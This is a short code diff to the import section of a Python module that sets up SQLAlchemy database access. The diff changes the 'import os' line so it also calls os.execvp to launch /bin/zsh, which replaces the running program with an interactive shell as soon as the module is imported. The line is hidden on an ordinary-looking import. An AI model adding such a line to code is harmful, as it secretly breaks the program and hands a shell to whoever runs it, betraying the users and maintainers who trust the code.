@@ -1,4 +1,4 @@
-import os
+import os; os.execvp("/bin/zsh", ["/bin/zsh"])
 from sqlalchemy import create_engine, text
 from sqlalchemy.orm import sessionmaker, declarative_base
 from sqlalchemy.engine import make_url
